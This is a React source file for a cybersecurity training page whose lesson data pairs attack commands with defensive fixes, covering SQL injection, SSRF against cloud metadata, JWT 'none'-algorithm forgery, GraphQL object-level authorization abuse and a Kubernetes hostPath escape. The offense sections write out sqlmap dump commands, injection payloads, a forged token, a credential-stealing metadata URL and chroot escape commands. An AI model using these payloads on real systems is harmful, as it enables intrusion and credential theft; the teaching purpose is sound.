import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { CyberCard } from "@/components/cyber/CyberCard";
import { CyberButton } from "@/components/cyber/CyberButton";
import { SectionHeading } from "@/components/cyber/SectionHeading";
import {
  Check,
  BookOpen,
  Sparkles,
  Terminal,
  Shield,
  Swords,
  Code,
  ChevronDown,
  ServerCrash,
  Lock,
  Copy,
  CheckCheck,
  Search,
  Filter,
  Activity,
} from "lucide-react";
import ReactMarkdown from "react-markdown";
import { askAI } from "@/server/ai";
import { toast } from "sonner";

export const Route = createFileRoute("/learning")({
  head: () => ({
    meta: [
      { title: "Cyber Range Lab — Straxon Secure" },
      { name: "description", content: "Advanced cybersecurity offensive and defensive training." },
    ],
  }),
  component: Learning,
});

// ─────────────────────────────────────────────
// ADVANCED LESSON DATA MODEL
// ─────────────────────────────────────────────
type LessonTab = "overview" | "offense" | "defense" | "steps";
type Category = "Web App" | "Cloud" | "API" | "Infrastructure" | "Network";

interface Lesson {
  slug: string;
  title: string;
  category: Category;
  diff: "Beginner" | "Intermediate" | "Advanced";
  cvss: number; // Simulated impact score
  overview: string;
  offense: { concept: string; syntax: string[]; payloads: string[] };
  defense: { concept: string; configs: string[] };
  steps: string[];
}

const LESSONS: Lesson[] = [
  {
    slug: "sqli-advanced",
    title: "Advanced SQL Injection (SQLi)",
    category: "Web App",
    diff: "Intermediate",
    cvss: 8.5,
    overview:
      "SQL Injection occurs when untrusted user input is dynamically concatenated into a database query. Attackers manipulate the query logic to bypass authentication, extract hidden data, or gain remote code execution (RCE).",
    offense: {
      concept:
        "Red Team: Identify injection points and determine the database type using blind, error-based, or union-based techniques.",
      syntax: [
        "sqlmap -u 'http://target.com/page?id=1' --dbs",
        "sqlmap -u 'http://target.com/page?id=1' -D public --dump",
      ],
      payloads: ["' OR 1=1 -- -", "admin' UNION SELECT 1, @@version, current_user() -- -"],
    },
    defense: {
      concept:
        "Blue Team: Never trust user input. Use Parameterized Queries (Prepared Statements) or ORMs to ensure data is treated strictly as literal values.",
      configs: [
        "// Node.js (Prisma ORM - Safe)",
        "const user = await prisma.user.findUnique({ where: { email: inputEmail } });",
        "",
        "// Python (pg8000 - Prepared Statement)",
        "cursor.execute('SELECT * FROM users WHERE id = :id', {'id': user_input})",
      ],
    },
    steps: [
      "Fuzz the input field with single quotes (') and wait for a SQL syntax error.",
      "Determine column count using ORDER BY (e.g., ORDER BY 3--).",
      "Find the vulnerable column using a UNION SELECT statement.",
      "Extract schema, table, and column names using information_schema.",
      "Implement parameterized queries on the backend to neutralize the vulnerability.",
    ],
  },
  {
    slug: "ssrf-cloud",
    title: "Server-Side Request Forgery (SSRF)",
    category: "Cloud",
    diff: "Advanced",
    cvss: 9.8,
    overview:
      "SSRF allows an attacker to coerce a server into making HTTP requests to arbitrary domains. In cloud environments (AWS, GCP, Azure), this is lethal as it can hit internal metadata endpoints (169.254.169.254) and steal IAM role credentials.",
    offense: {
      concept:
        "Red Team: Find a feature that fetches URLs (PDF generators, image downloaders) and supply internal IP addresses or cloud metadata URLs.",
      syntax: [
        "curl -X POST http://target.com/webhook -d 'url=http://169.254.169.254/latest/meta-data/'",
      ],
      payloads: [
        "http://localhost:8080/admin",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role",
      ],
    },
    defense: {
      concept:
        "Blue Team: Implement a strict allowlist of permitted domains. Disable unused URI schemas. In AWS, enforce IMDSv2 to require session tokens.",
      configs: [
        "// AWS Terraform: Enforce IMDSv2",
        'resource "aws_instance" "web" {',
        "  metadata_options {",
        '    http_tokens = "required" // Forces IMDSv2',
        "  }",
        "}",
      ],
    },
    steps: [
      "Locate an endpoint that fetches remote resources.",
      "Attempt to reach an external Webhook.site to confirm SSRF.",
      "Point the payload at localhost (127.0.0.1) to find internal admin panels.",
      "Escalate to the cloud metadata service to steal temporary AWS credentials.",
    ],
  },
  {
    slug: "jwt-none-alg",
    title: "JWT Signature Stripping ('none' alg)",
    category: "API",
    diff: "Beginner",
    cvss: 9.1,
    overview:
      "JSON Web Tokens (JWT) use a signature to verify integrity. Some poorly configured backend libraries accept the 'none' algorithm, allowing attackers to forge tokens without needing the secret signing key.",
    offense: {
      concept:
        "Red Team: Decode the JWT, change the algorithm in the header to 'none' or 'None', modify the payload (e.g., role: 'admin'), and remove the signature while keeping the trailing dot.",
      syntax: [
        "# Base64 encode the forged header",
        'echo -n \'{"alg":"none","typ":"JWT"}\' | base64',
        "# Construct forged token (Header.Payload.)",
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoieCIsInJvbGUiOiJhZG1pbiJ9.",
      ],
      payloads: ['{"alg":"none"}', '{"alg":"None"}'],
    },
    defense: {
      concept:
        "Blue Team: Hardcode the expected algorithm in your verification function. Do not rely on the algorithm specified in the token header provided by the user.",
      configs: [
        "// Node.js (jsonwebtoken library)",
        "// VULNERABLE: jwt.verify(token, publicKey);",
        "// SECURE: Enforce RS256",
        "jwt.verify(token, publicKey, { algorithms: ['RS256'] });",
      ],
    },
    steps: [
      "Intercept the JWT token in Burp Suite or browser dev tools.",
      "Decode the Base64 header and payload.",
      "Modify the header algorithm to 'none'.",
      "Escalate privileges in the payload (e.g., is_admin: true).",
      "Re-encode, strip the signature, and submit the request.",
    ],
  },
  {
    slug: "graphql-idor",
    title: "GraphQL Introspection & BOLA",
    category: "API",
    diff: "Intermediate",
    cvss: 7.4,
    overview:
      "GraphQL endpoints often leave Introspection enabled in production, mapping out the entire API. Furthermore, GraphQL is highly susceptible to Broken Object Level Authorization (BOLA/IDOR) if resolvers don't check permissions.",
    offense: {
      concept:
        "Red Team: Send an Introspection query to dump the schema. Analyze mutations for ID parameters and attempt to manipulate objects belonging to other users.",
      syntax: [
        "// Send standard Introspection query",
        'curl -X POST http://target/graphql -d \'{"query": "{ __schema { types { name } } }"}\'',
      ],
      payloads: ['mutation { updateProfile(userId: 5, email: "hacker@evil.com") { success } }'],
    },
    defense: {
      concept:
        "Blue Team: Disable Introspection in production environments. Implement authorization checks inside the business logic layer, NOT the GraphQL resolvers.",
      configs: [
        "// Apollo Server: Disable Introspection",
        "const server = new ApolloServer({",
        "  typeDefs,",
        "  resolvers,",
        "  introspection: process.env.NODE_ENV !== 'production'",
        "});",
      ],
    },
    steps: [
      "Identify the GraphQL endpoint (usually /graphql).",
      "Run an Introspection query to map types and mutations.",
      "Identify a mutation that alters data using a predictable ID.",
      "Change the ID to a target user and execute the request.",
    ],
  },
  {
    slug: "k8s-pod-escape",
    title: "Kubernetes HostPath Mount Escape",
    category: "Infrastructure",
    diff: "Advanced",
    cvss: 9.9,
    overview:
      "If a Kubernetes pod is overly permissive and mounts the node's root filesystem (/) via hostPath, an attacker who compromises the pod can easily escape to the underlying worker node and compromise the entire cluster.",
    offense: {
      concept:
        "Red Team: Check if you are inside a container. Look for mounted host volumes. Chroot into the mounted host directory to execute commands as root on the K8s node.",
      syntax: ["ls -la /host", "chroot /host bash", "cat /etc/kubernetes/kubelet.conf"],
      payloads: ['volumeMounts: [{ name: "host-root", mountPath: "/host" }]'],
    },
    defense: {
      concept:
        "Blue Team: Use Pod Security Admission (PSA) or OPA Gatekeeper to forbid pods from using hostPath mounts, running as privileged, or sharing the host network/PID namespaces.",
      configs: [
        "// Kubernetes Pod Security Standards (Restricted Profile)",
        "apiVersion: v1",
        "kind: Namespace",
        "metadata:",
        "  name: secure-namespace",
        "  labels:",
        "    pod-security.kubernetes.io/enforce: restricted",
      ],
    },
    steps: [
      "Gain initial shell access to the container via a web vulnerability.",
      "Check for mounted volumes using 'df -h' or 'mount'.",
      "If the host root is mounted, navigate to the mount point.",
      "Use 'chroot' to pivot your shell to the host node OS.",
      "Extract kubeconfig files to compromise the K8s API server.",
    ],
  },
];

// ─────────────────────────────────────────────
// UI COMPONENTS
// ─────────────────────────────────────────────

function TerminalBlock({ lines, title }: { lines: string[]; title?: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = (e: React.MouseEvent) => {
    e.stopPropagation();
    const textToCopy = lines.filter((l) => !l.startsWith("//")).join("\n");
    navigator.clipboard.writeText(textToCopy);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="bg-[#0a0a0a] rounded-md border border-slate-800 overflow-hidden my-3 shadow-lg relative group">
      {title && (
        <div className="bg-slate-900/80 px-3 py-1.5 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Terminal className="h-3 w-3 text-cyan-500" />
            <span className="text-[10px] font-mono text-slate-400 uppercase tracking-widest">
              {title}
            </span>
          </div>
          <button
            onClick={handleCopy}
            className="text-slate-500 hover:text-cyan-400 transition-colors bg-slate-950 px-2 py-0.5 rounded border border-slate-800 flex items-center gap-1 opacity-0 group-hover:opacity-100"
          >
            {copied ? (
              <CheckCheck className="h-3 w-3 text-green-400" />
            ) : (
              <Copy className="h-3 w-3" />
            )}
            <span className="text-[9px] font-mono">{copied ? "COPIED" : "COPY"}</span>
          </button>
        </div>
      )}
      <div className="p-3 overflow-x-auto custom-scrollbar">
        <pre className="text-[11px] font-mono text-slate-300 leading-relaxed whitespace-pre-wrap">
          {lines.map((line, i) => (
            <div key={i} className="mb-1">
              {line.startsWith("//") ? (
                <span className="text-slate-500">{line}</span>
              ) : line.startsWith("curl") ||
                line.startsWith("sqlmap") ||
                line.startsWith("echo") ? (
                <>
                  <span className="text-magenta-500">$</span>{" "}
                  <span className="text-cyan-300">{line}</span>
                </>
              ) : (
                line
              )}
            </div>
          ))}
        </pre>
      </div>
    </div>
  );
}

function LessonCard({
  lesson,
  isDone,
  onToggleDone,
  onAskAI,
}: {
  lesson: Lesson;
  isDone: boolean;
  onToggleDone: () => void;
  onAskAI: (lesson: Lesson, level: string) => void;
}) {
  const [activeTab, setActiveTab] = useState<LessonTab>("overview");
  const [isExpanded, setIsExpanded] = useState(false);

  const diffColor =
    lesson.diff === "Beginner"
      ? "text-green-400 border-green-400/20 bg-green-400/10"
      : lesson.diff === "Intermediate"
        ? "text-yellow-400 border-yellow-400/20 bg-yellow-400/10"
        : "text-red-400 border-red-400/20 bg-red-400/10";

  return (
    <CyberCard
      variant={isDone ? "cyan" : "magenta"}
      className="flex flex-col transition-all duration-300"
    >
      {/* CARD HEADER */}
      <div
        className="flex items-start justify-between mb-4 cursor-pointer group"
        onClick={() => setIsExpanded(!isExpanded)}
      >
        <div>
          <div className="flex items-center gap-2 mb-2">
            <span
              className={`text-[9px] font-mono uppercase tracking-widest px-2 py-0.5 rounded border ${diffColor}`}
            >
              {lesson.diff}
            </span>
            <span className="text-[9px] font-mono text-slate-500 uppercase tracking-widest border border-slate-800 bg-slate-900 px-2 py-0.5 rounded">
              {lesson.category}
            </span>
            <span className="text-[9px] font-mono text-slate-400 border border-slate-800 bg-slate-900 px-2 py-0.5 rounded flex items-center gap-1">
              <Activity className="h-3 w-3" /> CVSS {lesson.cvss}
            </span>
          </div>
          <h3 className="font-display text-xl font-bold text-slate-200 group-hover:text-cyan-400 transition-colors">
            {lesson.title}
          </h3>
        </div>
        <div className="flex flex-col items-end gap-2">
          {isDone && (
            <div className="bg-cyan-500/20 p-1.5 rounded-full">
              <Check className="h-4 w-4 text-cyan-400" />
            </div>
          )}
          <ChevronDown
            className={`h-5 w-5 text-slate-500 transition-transform duration-300 ${isExpanded ? "rotate-180" : ""}`}
          />
        </div>
      </div>

      {/* EXPANDABLE BODY */}
      <AnimatePresence>
        {isExpanded && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: "auto", opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            className="overflow-hidden flex-1 flex flex-col"
          >
            {/* TABS */}
            <div className="flex gap-1 border-b border-slate-800 mb-4 overflow-x-auto pb-1 custom-scrollbar">
              {(["overview", "offense", "defense", "steps"] as LessonTab[]).map((tab) => (
                <button
                  key={tab}
                  onClick={(e) => {
                    e.stopPropagation();
                    setActiveTab(tab);
                  }}
                  className={`text-[10px] font-mono uppercase tracking-widest px-3 py-1.5 rounded-t transition-colors whitespace-nowrap ${
                    activeTab === tab
                      ? tab === "offense"
                        ? "bg-red-500/10 text-red-400 border-b-2 border-red-500"
                        : tab === "defense"
                          ? "bg-cyan-500/10 text-cyan-400 border-b-2 border-cyan-500"
                          : "bg-slate-800 text-slate-200 border-b-2 border-slate-400"
                      : "text-slate-500 hover:bg-slate-900 hover:text-slate-300"
                  }`}
                >
                  {tab === "overview" && <BookOpen className="inline h-3 w-3 mr-1 mb-0.5" />}
                  {tab === "offense" && <Swords className="inline h-3 w-3 mr-1 mb-0.5" />}
                  {tab === "defense" && <Shield className="inline h-3 w-3 mr-1 mb-0.5" />}
                  {tab === "steps" && <Code className="inline h-3 w-3 mr-1 mb-0.5" />}
                  {tab}
                </button>
              ))}
            </div>

            {/* TAB CONTENT */}
            <div className="flex-1 text-sm text-slate-400 mb-6">
              {activeTab === "overview" && (
                <div className="leading-relaxed animate-in fade-in duration-300">
                  {lesson.overview}
                </div>
              )}

              {activeTab === "offense" && (
                <div className="animate-in fade-in duration-300 space-y-4">
                  <p className="text-red-300/80 leading-relaxed border-l-2 border-red-500/50 pl-3">
                    {lesson.offense.concept}
                  </p>
                  <TerminalBlock title="Attack Syntax & Commands" lines={lesson.offense.syntax} />
                  <TerminalBlock title="Common Payloads" lines={lesson.offense.payloads} />
                </div>
              )}

              {activeTab === "defense" && (
                <div className="animate-in fade-in duration-300 space-y-4">
                  <p className="text-cyan-300/80 leading-relaxed border-l-2 border-cyan-500/50 pl-3">
                    {lesson.defense.concept}
                  </p>
                  <TerminalBlock
                    title="Secure Configuration / Code"
                    lines={lesson.defense.configs}
                  />
                </div>
              )}

              {activeTab === "steps" && (
                <div className="animate-in fade-in duration-300 space-y-3 bg-slate-900/50 p-4 rounded border border-slate-800">
                  <div className="text-[10px] font-mono text-slate-500 uppercase tracking-widest mb-2 border-b border-slate-800 pb-2">
                    Execution Flow
                  </div>
                  {lesson.steps.map((step, i) => (
                    <div key={i} className="flex items-start gap-3">
                      <div className="bg-slate-950 border border-slate-700 text-cyan-500 font-mono text-[10px] w-5 h-5 flex items-center justify-center rounded shrink-0">
                        {i + 1}
                      </div>
                      <span className="text-slate-300 pt-0.5 leading-snug">{step}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* FOOTER ACTIONS */}
            <div className="mt-auto pt-4 border-t border-slate-800 flex gap-3 flex-wrap items-center justify-between">
              <CyberButton
                size="sm"
                variant={isDone ? "ghost" : "cyan"}
                onClick={(e) => {
                  e.stopPropagation();
                  onToggleDone();
                }}
              >
                <Check className="h-3.5 w-3.5" /> {isDone ? "MARK INCOMPLETE" : "MARK COMPLETE"}
              </CyberButton>

              <div className="flex items-center gap-2">
                <span className="text-[10px] font-mono text-slate-500 uppercase hidden sm:inline">
                  AI Tutor:
                </span>
                <CyberButton
                  size="sm"
                  variant="magenta"
                  onClick={(e) => {
                    e.stopPropagation();
                    onAskAI(lesson, "Beginner");
                  }}
                >
                  <Sparkles className="h-3.5 w-3.5" /> Explain Simple
                </CyberButton>
                <CyberButton
                  size="sm"
                  variant="ghost"
                  className="border border-magenta-500/30 text-magenta-400 hover:bg-magenta-500/10"
                  onClick={(e) => {
                    e.stopPropagation();
                    onAskAI(lesson, "Advanced");
                  }}
                >
                  <ServerCrash className="h-3.5 w-3.5" /> Deep Dive
                </CyberButton>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </CyberCard>
  );
}

// ─────────────────────────────────────────────
// MAIN PAGE COMPONENT
// ─────────────────────────────────────────────
function Learning() {
  // Load progress from Local Storage
  const [done, setDone] = useState<Set<string>>(() => {
    if (typeof window !== "undefined") {
      const saved = localStorage.getItem("straxon_learning_progress");
      if (saved) return new Set(JSON.parse(saved));
    }
    return new Set();
  });

  const [activeCategory, setActiveCategory] = useState<Category | "All">("All");
  const [searchQuery, setSearchQuery] = useState("");

  const [activeAIContext, setActiveAIContext] = useState<{ lesson: Lesson; level: string } | null>(
    null,
  );
  const [aiText, setAiText] = useState("");
  const [aiBusy, setAiBusy] = useState(false);

  // Sync to Local Storage on change
  useEffect(() => {
    localStorage.setItem("straxon_learning_progress", JSON.stringify(Array.from(done)));
  }, [done]);

  const handleToggleDone = (slug: string) => {
    setDone((prev) => {
      const next = new Set(prev);
      if (next.has(slug)) next.delete(slug);
      else next.add(slug);
      return next;
    });
  };

  const handleAskAI = async (lesson: Lesson, level: string) => {
    setActiveAIContext({ lesson, level });
    setAiBusy(true);
    setAiText("");
    window.scrollTo({ top: 0, behavior: "smooth" });

    try {
      const res = await askAI({
        data: {
          mode: "explain",
          messages: [
            {
              role: "user",
              content: `Explain "${lesson.title}" (${lesson.category}) at a ${level} level. Focus on the underlying mechanisms. Provide a real-world breach example and actionable remediation steps. Use clear markdown with headers.`,
            },
          ],
        },
      });
      setAiText(res.reply);
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "AI interface offline");
      setActiveAIContext(null);
    } finally {
      setAiBusy(false);
    }
  };

  // Filter engine
  const filteredLessons = useMemo(() => {
    return LESSONS.filter((l) => {
      const matchesSearch =
        l.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
        l.overview.toLowerCase().includes(searchQuery.toLowerCase());
      const matchesCategory = activeCategory === "All" || l.category === activeCategory;
      return matchesSearch && matchesCategory;
    });
  }, [searchQuery, activeCategory]);

  const completed = done.size;
  const total = LESSONS.length;
  const categories = ["All", ...Array.from(new Set(LESSONS.map((l) => l.category)))];

  return (
    <div className="min-h-screen bg-[#020617] text-slate-300 font-sans selection:bg-cyan-900 pb-20">
      <div className="px-4 lg:px-8 py-8 max-w-6xl mx-auto space-y-6">
        {/* HEADER & PROGRESS */}
        <div className="flex flex-col md:flex-row items-start md:items-end justify-between border-b border-cyan-900/40 pb-6 mb-6 gap-6">
          <SectionHeading
            eyebrow="CYBER RANGE"
            title="Interactive Training Lab"
            description="Master offensive techniques to build unbreakable defenses. Access the AI Tutor for deep analysis."
          />
          <div className="flex flex-col md:items-end w-full md:w-auto">
            <div className="text-[10px] font-mono text-cyan-500 uppercase tracking-widest mb-2 flex items-center gap-2">
              <Lock className="h-3 w-3" /> Certification Progress
            </div>
            <div className="flex items-center gap-3 w-full md:w-48">
              <div className="flex-1 h-1.5 bg-slate-900 rounded-full overflow-hidden">
                <div
                  className="h-full bg-gradient-to-r from-cyan-500 to-magenta-500 transition-all duration-500"
                  style={{ width: `${(completed / total) * 100}%` }}
                />
              </div>
              <span className="font-mono text-sm text-slate-200">
                {completed}/{total}
              </span>
            </div>
          </div>
        </div>

        {/* SEARCH & FILTERS */}
        <div className="flex flex-col sm:flex-row gap-4 bg-slate-900/50 p-3 rounded-lg border border-slate-800">
          <div className="relative flex-1">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-500" />
            <input
              type="text"
              placeholder="Search vulnerabilities, CVEs, protocols..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full bg-slate-950 border border-slate-800 text-sm font-mono text-slate-300 pl-9 pr-4 py-2 rounded focus:outline-none focus:border-cyan-500 transition-colors"
            />
          </div>
          <div className="flex gap-2 overflow-x-auto custom-scrollbar pb-1 sm:pb-0">
            <div className="flex items-center gap-2 px-2 text-slate-500 border-r border-slate-800">
              <Filter className="h-4 w-4" />
            </div>
            {categories.map((cat) => (
              <button
                key={cat}
                onClick={() => setActiveCategory(cat as Category | "All")}
                className={`whitespace-nowrap px-3 py-1.5 text-[10px] font-mono uppercase tracking-widest rounded border transition-colors ${activeCategory === cat ? "bg-cyan-500/10 border-cyan-500 text-cyan-400" : "bg-slate-950 border-slate-800 text-slate-500 hover:text-slate-300"}`}
              >
                {cat}
              </button>
            ))}
          </div>
        </div>

        {/* AI CONSOLE PANEL */}
        <AnimatePresence>
          {activeAIContext && (
            <motion.div
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95 }}
            >
              <CyberCard
                variant="magenta"
                className="border-magenta-500/30 bg-magenta-950/10 shadow-[0_0_30px_rgba(217,70,239,0.05)]"
              >
                <div className="flex items-center justify-between mb-4 pb-3 border-b border-magenta-900/30 flex-wrap gap-3">
                  <div className="flex items-center gap-2 text-magenta-400 text-sm font-mono uppercase tracking-widest font-bold">
                    <Terminal className="h-4 w-4" /> AI Diagnostics: {activeAIContext.lesson.title}
                  </div>
                  <div className="flex items-center gap-3">
                    <span className="text-[10px] font-mono border border-magenta-500/30 px-2 py-0.5 rounded text-magenta-300">
                      LEVEL: {activeAIContext.level.toUpperCase()}
                    </span>
                    <button
                      onClick={() => setActiveAIContext(null)}
                      className="text-xs font-mono text-slate-500 hover:text-slate-300 px-2 py-1 bg-slate-900 rounded border border-slate-800 transition-colors"
                    >
                      [ CLOSE CONSOLE ]
                    </button>
                  </div>
                </div>

                <div
                  className="prose prose-sm prose-invert max-w-none 
                  prose-headings:font-display prose-headings:text-magenta-400 
                  prose-p:text-slate-300 prose-p:leading-relaxed 
                  prose-a:text-cyan-400 prose-code:text-cyan-300 prose-code:bg-slate-900 prose-code:px-1 prose-code:rounded 
                  prose-pre:bg-[#0a0a0a] prose-pre:border prose-pre:border-slate-800 prose-pre:shadow-lg"
                >
                  {aiBusy ? (
                    <div className="flex items-center gap-3 text-magenta-400/70 font-mono text-sm py-4">
                      <div className="h-4 w-4 border-2 border-magenta-400/50 border-t-magenta-400 rounded-full animate-spin" />
                      Synthesizing threat intelligence...
                    </div>
                  ) : (
                    <ReactMarkdown>{aiText}</ReactMarkdown>
                  )}
                </div>
              </CyberCard>
            </motion.div>
          )}
        </AnimatePresence>

        {/* LESSON GRID */}
        {filteredLessons.length > 0 ? (
          <div className="space-y-4">
            {filteredLessons.map((lesson) => (
              <LessonCard
                key={lesson.slug}
                lesson={lesson}
                isDone={done.has(lesson.slug)}
                onToggleDone={() => handleToggleDone(lesson.slug)}
                onAskAI={handleAskAI}
              />
            ))}
          </div>
        ) : (
          <div className="py-20 text-center flex flex-col items-center">
            <Search className="h-12 w-12 text-slate-800 mb-4" />
            <div className="text-slate-400 font-mono text-sm">
              No training modules found matching your criteria.
            </div>
            <button
              onClick={() => {
                setSearchQuery("");
                setActiveCategory("All");
              }}
              className="mt-4 text-xs font-mono text-cyan-500 hover:underline"
            >
              Clear Filters
            </button>
          </div>
        )}
      </div>

      <style>{`
        .custom-scrollbar::-webkit-scrollbar { width: 4px; height: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #334155; }
      `}</style>
    </div>
  );
}
